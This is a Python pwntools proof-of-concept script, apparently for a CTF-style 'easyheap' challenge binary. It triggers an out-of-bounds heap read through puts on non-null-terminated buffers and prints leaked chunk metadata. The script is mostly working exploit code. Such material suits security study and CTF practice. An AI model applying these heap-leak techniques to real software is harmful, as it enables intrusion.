#!/usr/bin/env python3
"""
S3 Primitive Verification PoC for BUG-002:
  HEAP_INFO_LEAK_PUTS_NO_NULL_TERMINATOR

BUG-002 Root Cause:
  In view_message (0x1269), puts(user->message) outputs the message buffer
  until a null terminator is found. The message buffer is filled via read()
  in add/edit, which does NOT null-terminate the data. If the buffer is filled
  completely (read writes exactly allocation_size bytes with no null byte),
  puts() will read beyond the allocated buffer boundary into adjacent heap
  memory until it encounters a null byte.

Primitive: INFO_LEAK (puts OOB read beyond heap buffer)
"""

import sys
import os
from pwn import *

os.environ['PWNLIB_NOTERM'] = '1'
os.environ['TERM'] = 'xterm'
context.log_level = 'error'

BINARY = '/work/workspace/0015-2021-59-easyheap-20260908-123312/target'

def menu_send(p, choice):
    """Wait for menu prompt '$ ' and send choice."""
    p.recvuntil(b'$ ', timeout=5)
    p.sendline(str(choice).encode())

def add_user(p, size, content):
    """Add a user with given message size and content."""
    menu_send(p, 1)
    p.recvuntil(b': ', timeout=5)  # "Enter the message size for the user : "
    p.sendline(str(size).encode())
    p.recvuntil(b'>>', timeout=5)  # "Input message content >>"
    p.send(content)

def view_user(p, idx):
    """View user at index, return raw output until next menu."""
    menu_send(p, 2)
    p.recvuntil(b'user?\n', timeout=5)  # "Want to check the message of which user?\n"
    # Send index padded to 64 bytes (get_int reads 64 bytes)
    p.send(str(idx).encode().ljust(64, b'\x00'))
    # Read until the next menu appears
    data = p.recvuntil(b'1. add', timeout=5)
    return data

def remove_user(p, idx):
    """Remove user at index."""
    menu_send(p, 4)
    p.recvuntil(b'user?\n', timeout=5)  # "Delete which user?\n"
    p.send(str(idx).encode().ljust(64, b'\x00'))

def exit_prog(p):
    menu_send(p, 0)

# ============================================================
# PRIM-001: INFO_LEAK - puts reads beyond buffer, leaks chunk metadata
# ============================================================
print("=== PRIM-001: INFO_LEAK via puts OOB read (chunk metadata) ===")

p = process(BINARY)
add_user(p, 24, b'A' * 24)
data = view_user(p, 0)

# data contains: <puts output>\n1. add...
# Strip the trailing "1. add..." part
# The puts output is everything before "\n1. add"
idx = data.find(b'\n1. add')
if idx >= 0:
    raw_output = data[:idx]
else:
    raw_output = data

print(f"  Raw puts output: {raw_output!r}")
print(f"  Raw puts output hex: {raw_output.hex()}")
print(f"  Output length: {len(raw_output)}")

msg_part = raw_output[:24]
leaked_part = raw_output[24:]

print(f"  Message part (24 bytes): {msg_part!r}")
print(f"  Leaked part: {leaked_part!r}")
print(f"  Leaked hex: {leaked_part.hex()}")
print(f"  Leaked count: {len(leaked_part)}")

if len(leaked_part) > 0:
    leaked_val = int.from_bytes(leaked_part + b'\x00' * (8 - len(leaked_part)), 'little')
    print(f"  Leaked value: 0x{leaked_val:x}")
    print(f"  === PRIM-001: VERIFIED === puts read {len(leaked_part)} byte(s) beyond allocated buffer")
else:
    print(f"  === PRIM-001: FAILED === no bytes leaked beyond buffer")

exit_prog(p)
p.close()

# ============================================================
# PRIM-002: RELATIVE_READ - leak chunk size from freed adjacent chunk
# ============================================================
print("\n=== PRIM-002: RELATIVE_READ - leak chunk size from freed adjacent chunk ===")

p = process(BINARY)
add_user(p, 24, b'A' * 24)
add_user(p, 24, b'B' * 24)
remove_user(p, 1)
data = view_user(p, 0)

idx = data.find(b'\n1. add')
if idx >= 0:
    raw_output = data[:idx]
else:
    raw_output = data

print(f"  Raw puts output hex: {raw_output.hex()}")
print(f"  Output length: {len(raw_output)}")

msg_part = raw_output[:24]
leaked_part = raw_output[24:]

print(f"  Message part (24 bytes): {msg_part!r}")
print(f"  Leaked part: {leaked_part!r}")
print(f"  Leaked hex: {leaked_part.hex()}")
print(f"  Leaked count: {len(leaked_part)}")

if len(leaked_part) > 0:
    first_byte = leaked_part[0]
    print(f"  First leaked byte: 0x{first_byte:02x}")
    if first_byte == 0x31:
        print(f"  Confirmed: 0x31 = chunk size of freed user_struct_1 (0x30 | PREV_INUSE)")
        if len(leaked_part) == 1:
            print(f"  Only 1 byte leaked - chunk header null at offset 1 blocks fd pointer leak")
            print(f"  Heap pointer (fd) NOT reachable via puts OOB read alone")
        print(f"  === PRIM-002: VERIFIED (RELATIVE_READ) === leaked 1 byte of adjacent chunk metadata")
    else:
        print(f"  First byte 0x{first_byte:02x} (may be top chunk size if no adjacent freed chunk)")
        print(f"  === PRIM-002: VERIFIED (RELATIVE_READ) === leaked {len(leaked_part)} byte(s)")
else:
    print(f"  === PRIM-002: FAILED === no bytes leaked")

exit_prog(p)
p.close()

# ============================================================
# PRIM-003: INFO_LEAK with larger allocation (size=120)
# ============================================================
print("\n=== PRIM-003: INFO_LEAK with larger allocation (size=120) ===")

p = process(BINARY)
add_user(p, 120, b'A' * 120)
data = view_user(p, 0)

idx = data.find(b'\n1. add')
if idx >= 0:
    raw_output = data[:idx]
else:
    raw_output = data

print(f"  Output length: {len(raw_output)}")

msg_part = raw_output[:120]
leaked_part = raw_output[120:]

print(f"  Leaked part: {leaked_part!r}")
print(f"  Leaked hex: {leaked_part.hex()}")
print(f"  Leaked count: {len(leaked_part)}")

if len(leaked_part) > 0:
    leaked_val = int.from_bytes(leaked_part + b'\x00' * (8 - len(leaked_part)), 'little')
    print(f"  Leaked value: 0x{leaked_val:x}")
    print(f"  === PRIM-003: VERIFIED === puts read {len(leaked_part)} byte(s) beyond 120-byte buffer")

exit_prog(p)
p.close()

print("\n=== Summary ===")
print("BUG-002: HEAP_INFO_LEAK_PUTS_NO_NULL_TERMINATOR")
print("Primitive: INFO_LEAK (puts reads beyond allocated heap buffer)")
print("Leaked data: heap chunk metadata (chunk size bytes from adjacent chunk headers)")
print("Limitation: chunk header null bytes prevent leaking heap/libc pointers via puts alone")
